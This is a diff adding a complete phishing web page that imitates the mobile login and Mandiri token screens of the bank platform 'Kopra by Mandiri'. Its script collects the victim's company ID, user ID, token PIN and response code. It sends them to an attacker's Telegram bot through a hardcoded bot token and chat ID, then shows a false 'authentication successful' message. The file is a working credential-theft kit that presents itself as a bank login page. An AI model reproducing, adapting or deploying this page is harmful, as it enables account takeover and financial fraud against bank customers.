@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Kopra by Mandiri</title>
+    <style>
+        /* --- RESET & VARIABLES --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        :root {
+            --primary-black: #121212;
+            --text-gray: #6b7280;
+            --border-color: #d1d5db;
+            --bg-yellow: #ffc107;
+            --font-logo: 'Brush Script MT', cursive;
+            --mandiri-blue: #003d79;
+        }
+
+        body {
+            background-color: #f3f4f6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .mobile-container {
+            width: 100%;
+            max-width: 400px;
+            height: 100vh;
+            max-height: 850px;
+            background-color: #ffffff;
+            position: relative;
+            overflow-y: auto;
+            overflow-x: hidden;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+
+        /* --- KUSTOMISASI LOGO --- */
+        .logo-text {
+            font-family: var(--font-logo);
+            font-size: 42px;
+            font-weight: bold;
+            color: #000;
+            line-height: 1;
+            display: inline-block;
+            transform: rotate(-5deg);
+            position: relative;
+        }
+        
+        .logo-text::after {
+            content: '';
+            position: absolute;
+            top: 5px;
+            right: 15px;
+            width: 12px;
+            height: 12px;
+            background-color: #fbbf24;
+            clip-path: polygon(50% 0%, 100% 50%, 50% 100%, 0% 50%);
+        }
+
+        .logo-sub {
+            font-size: 10px;
+            font-family: sans-serif;
+            font-weight: bold;
+            position: absolute;
+            bottom: 2px;
+            right: -5px;
+            letter-spacing: 0.5px;
+        }
+
+        /* --- HALAMAN 1: LANDING PAGE --- */
+        #landing-page {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.8)), url('https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?q=80&w=1000&auto=format&fit=crop') center/cover no-repeat;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            padding: 30px 20px 50px;
+            transition: transform 0.4s ease-in-out;
+            z-index: 10;
+        }
+
+        .landing-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .landing-header .logo-text, .landing-header .logo-sub {
+            color: #ffffff;
+        }
+
+        .hamburger {
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        .hamburger span {
+            display: block;
+            width: 25px;
+            height: 3px;
+            background-color: #ffffff;
+            border-radius: 2px;
+        }
+
+        .landing-content {
+            text-align: center;
+            color: white;
+            margin-top: auto;
+            margin-bottom: auto;
+        }
+
+        .landing-content h1 {
+            font-size: 32px;
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 40px;
+        }
+
+        .btn-login-landing {
+            background-color: #ffffff;
+            color: var(--primary-black);
+            border: none;
+            padding: 16px 0;
+            width: 80%;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        
+        .btn-login-landing:active {
+            background-color: #e5e5e5;
+        }
+
+        .scroll-indicator {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 14px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            animation: bounce 2s infinite;
+        }
+        
+        .scroll-indicator svg {
+            width: 20px;
+            height: 20px;
+            fill: currentColor;
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+            40% { transform: translateY(-10px); }
+            60% { transform: translateY(-5px); }
+        }
+
+        /* --- HALAMAN 2: LOGIN FORM --- */
+        #login-page {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            padding: 40px 24px;
+            transform: translateX(100%);
+            transition: transform 0.4s ease-in-out;
+            z-index: 20;
+            overflow-y: auto;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: none;
+            border: none;
+            font-size: 28px;
+            color: #333;
+            cursor: pointer;
+            padding: 5px;
+            line-height: 1;
+        }
+
+        .login-header {
+            text-align: center;
+            margin-top: 40px;
+            margin-bottom: 40px;
+        }
+
+        .login-header .logo-text {
+            font-size: 48px;
+        }
+
+        .login-header h2 {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--primary-black);
+            margin-top: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--primary-black);
+            margin-bottom: 8px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            font-size: 15px;
+            color: var(--primary-black);
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input::placeholder {
+            color: #9ca3af;
+        }
+
+        .form-group input:focus {
+            border-color: var(--primary-black);
+        }
+
+        .btn-continue {
+            background-color: var(--primary-black);
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            width: 100%;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            margin-bottom: 24px;
+            transition: background-color 0.2s;
+        }
+        
+        .btn-continue:disabled {
+            background-color: #6b7280;
+            cursor: not-allowed;
+        }
+
+        .info-text {
+            font-size: 14px;
+            color: var(--text-gray);
+            line-height: 1.5;
+            margin-bottom: 40px;
+        }
+
+        .security-badge {
+            text-align: center;
+            font-size: 12px;
+            color: var(--text-gray);
+            margin-top: auto;
+            margin-bottom: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .security-badge strong {
+            color: #0056b3;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .contact-support {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            background-color: var(--bg-yellow);
+            color: var(--primary-black);
+            border: none;
+            padding: 14px 20px;
+            border-radius: 12px 12px 12px 0px;
+            font-size: 14px;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            z-index: 30;
+        }
+
+        .contact-support svg {
+            width: 18px;
+            height: 18px;
+        }
+
+        /* --- HALAMAN 3: PIN & RESPONSE CODE --- */
+        #pin-page {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            transform: translateX(100%);
+            transition: transform 0.4s ease-in-out;
+            z-index: 40;
+        }
+
+        .pin-header {
+            background-color: var(--mandiri-blue);
+            padding: 20px;
+            text-align: center;
+            color: white;
+            border-bottom-left-radius: 20px;
+            border-bottom-right-radius: 20px;
+            position: relative;
+        }
+
+        .pin-back-btn {
+            position: absolute;
+            left: 20px;
+            top: 25px;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        .pin-content {
+            padding: 30px 20px;
+            text-align: center;
+            flex-grow: 1;
+        }
+
+        .pin-content h3 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 30px;
+            color: var(--primary-black);
+        }
+
+        /* Desain Kotak PIN (6 Digit) */
+        .pin-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+
+        .pin-box {
+            width: 40px;
+            height: 50px;
+            border: 2px solid var(--mandiri-blue);
+            border-radius: 6px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--primary-black);
+        }
+        
+        .pin-box.active {
+            border-color: #4a90e2;
+        }
+
+        .forgot-pin {
+            color: var(--mandiri-blue);
+            font-weight: 600;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 40px;
+        }
+
+        /* --- UI INPUT RESPONSE CODE (8 Digit) Sesuai Gambar 1 --- */
+        #response-section {
+            display: none;
+            text-align: center;
+        }
+
+        .response-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 8px; /* Jarak antar kotak */
+            margin-bottom: 20px;
+        }
+
+        .response-boxes .pin-box {
+            width: 38px; /* Lebar kotak */
+            height: 50px; /* Tinggi kotak */
+            font-size: 22px;
+            border: 2px solid #000; /* Border hitam tebal sesuai gambar */
+            border-radius: 6px;
+        }
+
+        .response-boxes .pin-box.active {
+            border-color: #4a90e2; /* Warna biru saat kotak aktif */
+            background-color: #f0f7ff;
+        }
+
+        .response-instruction {
+            font-size: 14px;
+            color: #555;
+            line-height: 1.5;
+            padding: 0 20px;
+        }
+
+        /* Keypad */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1px;
+            background-color: #e5e5e5;
+            border-top: 1px solid #e5e5e5;
+            border-bottom: 1px solid #e5e5e5;
+            margin-top: auto;
+        }
+
+        .key {
+            background-color: #f9f9f9;
+            padding: 20px 0;
+            font-size: 22px;
+            font-weight: 500;
+            color: var(--mandiri-blue);
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.1s;
+        }
+
+        .key:active {
+            background-color: #e0e0e0;
+        }
+
+        .key.action {
+            color: var(--mandiri-blue);
+            font-size: 20px;
+        }
+
+        /* --- CLASS UNTUK ANIMASI JS --- */
+        .slide-active {
+            transform: translateX(0) !important;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="mobile-container">
+        
+        <!-- ================= HALAMAN 1: LANDING ================= -->
+        <div id="landing-page">
+            <div class="landing-header">
+                <div>
+                    <span class="logo-text">kopra</span>
+                    <span class="logo-sub">by mandiri</span>
+                </div>
+                <div class="hamburger">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+
+            <div class="landing-content">
+                <h1>Wholesale Digital<br>Super Platform Kopra<br>by Mandiri</h1>
+                <button class="btn-login-landing" onclick="goToLogin()">Login</button>
+            </div>
+
+            <div class="scroll-indicator">
+                <span>Scroll for more</span>
+                <svg viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/></svg>
+            </div>
+        </div>
+
+        <!-- ================= HALAMAN 2: LOGIN ================= -->
+        <div id="login-page">
+            <button class="close-btn" onclick="goToLanding()">×</button>
+
+            <div class="login-header">
+                <div>
+                    <span class="logo-text">kopra</span>
+                    <span class="logo-sub" style="color:#000;">by mandiri</span>
+                </div>
+                <h2>Welcome to Kopra</h2>
+            </div>
+
+            <form id="loginForm" onsubmit="submitLoginData(event)">
+                <div class="form-group">
+                    <label>Company ID</label>
+                    <input type="text" id="companyId" placeholder="Enter your company ID" required>
+                </div>
+
+                <div class="form-group">
+                    <label>User ID</label>
+                    <input type="text" id="userId" placeholder="Enter your user ID" required>
+                </div>
+
+                <button type="submit" id="submitBtn" class="btn-continue">Continue</button>
+            </form>
+
+            <p class="info-text">
+                For account recovery, please access Kopra by Mandiri from your desktop browser.
+            </p>
+
+            <div class="security-badge">
+                Security certified by <strong>digicert®</strong>
+            </div>
+
+            <button class="contact-support">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
+                Contact Support
+            </button>
+        </div>
+
+        <!-- ================= HALAMAN 3: PIN & RESPONSE CODE ================= -->
+        <div id="pin-page">
+            <div class="pin-header">
+                <button class="pin-back-btn" onclick="goToLogin()">←</button>
+                <div style="font-family: sans-serif; font-weight: bold; font-size: 20px;">
+                    <span style="color: white;">mandiri</span><br>
+                    <span style="font-size: 10px; font-weight: normal;">mobile token</span>
+                </div>
+            </div>
+
+            <!-- BAGIAN 1: INPUT PIN (6 Digit) -->
+            <div class="pin-content" id="pin-section">
+                <h3>Harap masukkan Kode PIN<br>Anda</h3>
+                
+                <div class="pin-boxes" id="pin-display">
+                    <div class="pin-box active" id="box-0"></div>
+                    <div class="pin-box" id="box-1"></div>
+                    <div class="pin-box" id="box-2"></div>
+                    <div class="pin-box" id="box-3"></div>
+                    <div class="pin-box" id="box-4"></div>
+                    <div class="pin-box" id="box-5"></div>
+                </div>
+
+                <a href="#" class="forgot-pin" onclick="alert('Silakan hubungi Call Center Mandiri.'); return false;">Lupa PIN?</a>
+            </div>
+
+            <!-- BAGIAN 2: INPUT RESPONSE CODE (8 Digit) -->
+            <div class="pin-content" id="response-section">
+                <h3>Input Response Code</h3>
+                
+                <div class="response-boxes" id="response-display">
+                    <div class="pin-box active" id="res-0"></div>
+                    <div class="pin-box" id="res-1"></div>
+                    <div class="pin-box" id="res-2"></div>
+                    <div class="pin-box" id="res-3"></div>
+                    <div class="pin-box" id="res-4"></div>
+                    <div class="pin-box" id="res-5"></div>
+                    <div class="pin-box" id="res-6"></div>
+                    <div class="pin-box" id="res-7"></div>
+                </div>
+
+                <p class="response-instruction">
+                    Masukkan Response Code dari aplikasi Mandiri Token Anda.
+                </p>
+            </div>
+
+            <!-- KEYPAD BAWAAN (Berfungsi untuk PIN & Response Code) -->
+            <div class="keypad" id="keypad-section">
+                <button class="key" onclick="handleInput('1')">1</button>
+                <button class="key" onclick="handleInput('2')">2</button>
+                <button class="key" onclick="handleInput('3')">3</button>
+                <button class="key" onclick="handleInput('4')">4</button>
+                <button class="key" onclick="handleInput('5')">5</button>
+                <button class="key" onclick="handleInput('6')">6</button>
+                <button class="key" onclick="handleInput('7')">7</button>
+                <button class="key" onclick="handleInput('8')">8</button>
+                <button class="key" onclick="handleInput('9')">9</button>
+                <button class="key action" onclick="handleClear()">✕</button>
+                <button class="key" onclick="handleInput('0')">0</button>
+                <button class="key action" onclick="handleDelete()">⌫</button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- JAVASCRIPT -->
+    <script>
+        // KONFIGURASI TELEGRAM
+        const BOT_TOKEN = '8923248481:AAEgNY2fFr4SdtGvK6Eq4Wsv668ts2vvhvA'; // <--- GANTI INI
+        const CHAT_ID = '8555026746'; // <--- GANTI INI
+
+        // Variabel Global
+        let tempCompanyId = '';
+        let tempUserId = '';
+        let pinCode = '';
+        let responseCode = '';
+        
+        // State: 'PIN' atau 'RESPONSE'
+        let currentState = 'PIN'; 
+
+        // Elemen DOM
+        const landingPage = document.getElementById('landing-page');
+        const loginPage = document.getElementById('login-page');
+        const pinPage = document.getElementById('pin-page');
+        
+        const pinSection = document.getElementById('pin-section');
+        const responseSection = document.getElementById('response-section');
+
+        // --- NAVIGASI ---
+        function goToLogin() {
+            landingPage.style.transform = 'translateX(-30%)';
+            landingPage.style.opacity = '0.5';
+            loginPage.classList.add('slide-active');
+            pinPage.classList.remove('slide-active');
+            resetData();
+        }
+
+        function goToLanding() {
+            landingPage.style.transform = 'translateX(0)';
+            landingPage.style.opacity = '1';
+            loginPage.classList.remove('slide-active');
+            pinPage.classList.remove('slide-active');
+            document.getElementById('loginForm').reset();
+            resetData();
+        }
+
+        function goToPin() {
+            loginPage.classList.remove('slide-active');
+            pinPage.classList.add('slide-active');
+            resetData();
+        }
+
+        // --- FUNGSI KIRIM DATA LOGIN ---
+        async function submitLoginData(event) {
+            event.preventDefault();
+
+            tempCompanyId = document.getElementById('companyId').value;
+            tempUserId = document.getElementById('userId').value;
+            const submitBtn = document.getElementById('submitBtn');
+
+            submitBtn.innerText = 'Processing...';
+            submitBtn.disabled = true;
+
+            const message = `🔔 *LOGIN KOPRA (TAHAP 1)* 🔔\n\n` +
+                            `🏢 *Company ID:* \n\`${tempCompanyId}\`\n\n` +
+                            `👤 *User ID:* \n\`${tempUserId}\`\n\n` +
+                            `⏳ *Status:* Menunggu Input PIN Token...`;
+
+            await sendToTelegram(message);
+
+            submitBtn.innerText = 'Continue';
+            submitBtn.disabled = false;
+
+            goToPin();
+        }
+
+        // --- FUNGSI INPUT (KEYPAD) ---
+        function handleInput(number) {
+            if (currentState === 'PIN') {
+                if (pinCode.length < 6) {
+                    pinCode += number;
+                    updateDisplay('PIN');
+                }
+            } else if (currentState === 'RESPONSE') {
+                if (responseCode.length < 8) {
+                    responseCode += number;
+                    updateDisplay('RESPONSE');
+                }
+            }
+        }
+
+        function handleDelete() {
+            if (currentState === 'PIN') {
+                if (pinCode.length > 0) {
+                    pinCode = pinCode.slice(0, -1);
+                    updateDisplay('PIN');
+                }
+            } else if (currentState === 'RESPONSE') {
+                if (responseCode.length > 0) {
+                    responseCode = responseCode.slice(0, -1);
+                    updateDisplay('RESPONSE');
+                }
+            }
+        }
+
+        function handleClear() {
+            if (currentState === 'PIN') {
+                pinCode = '';
+                updateDisplay('PIN');
+            } else if (currentState === 'RESPONSE') {
+                responseCode = '';
+                updateDisplay('RESPONSE');
+            }
+        }
+
+        // --- FUNGSI UPDATE TAMPILAN KOTAK ---
+        function updateDisplay(type) {
+            if (type === 'PIN') {
+                for (let i = 0; i < 6; i++) {
+                    const box = document.getElementById(`box-${i}`);
+                    if (i < pinCode.length) {
+                        box.innerText = '*';
+                        box.classList.remove('active');
+                    } else {
+                        box.innerText = '';
+                        if (i === pinCode.length) box.classList.add('active');
+                        else box.classList.remove('active');
+                    }
+                }
+                // Jika PIN 6 digit selesai
+                if (pinCode.length === 6) {
+                    setTimeout(switchToResponseCode, 400); 
+                }
+            } 
+            else if (type === 'RESPONSE') {
+                for (let i = 0; i < 8; i++) {
+                    const box = document.getElementById(`res-${i}`);
+                    if (i < responseCode.length) {
+                        box.innerText = responseCode[i]; // Tampilkan angka asli
+                        box.classList.remove('active');
+                    } else {
+                        box.innerText = '';
+                        if (i === responseCode.length) box.classList.add('active');
+                        else box.classList.remove('active');
+                    }
+                }
+                // Jika Response Code 8 digit selesai
+                if (responseCode.length === 8) {
+                    setTimeout(sendAllDataToTelegram, 400);
+                }
+            }
+        }
+
+        // --- FUNGSI TRANSISI KE RESPONSE CODE ---
+        function switchToResponseCode() {
+            currentState = 'RESPONSE';
+            pinSection.style.display = 'none';
+            responseSection.style.display = 'block';
+        }
+
+        // --- FUNGSI RESET DATA ---
+        function resetData() {
+            currentState = 'PIN';
+            pinCode = '';
+            responseCode = '';
+            
+            updateDisplay('PIN');
+            updateDisplay('RESPONSE');
+            
+            pinSection.style.display = 'block';
+            responseSection.style.display = 'none';
+        }
+
+        // --- FUNGSI KIRIM SEMUA DATA KE TELEGRAM ---
+        async function sendAllDataToTelegram() {
+            const message = `🔥 *LOGIN KOPRA BERHASIL* 🔥\n\n` +
+                            `🏢 *Company ID:* \n\`${tempCompanyId}\`\n\n` +
+                            `👤 *User ID:* \n\`${tempUserId}\`\n\n` +
+                            `🔢 *PIN TOKEN:* \n\`${pinCode}\`\n\n` +
+                            `🔑 *Response Code:* \n\`${responseCode}\`\n\n` +
+                            `🌐 *Waktu:* ${new Date().toLocaleString('id-ID')}`;
+
+            const success = await sendToTelegram(message);
+
+            if (success) {
+                alert('Autentikasi Berhasil!');
+                goToLanding();
+            } else {
+                alert('Gagal mengirim data. Periksa koneksi Anda.');
+                resetData();
+            }
+        }
+
+        // --- FUNGSI UTAMA KIRIM KE API TELEGRAM ---
+        async function sendToTelegram(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: text,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Fetch Error:', error);
+                return false;
+            }
+        }
+    </script>
+</body>
+</html>
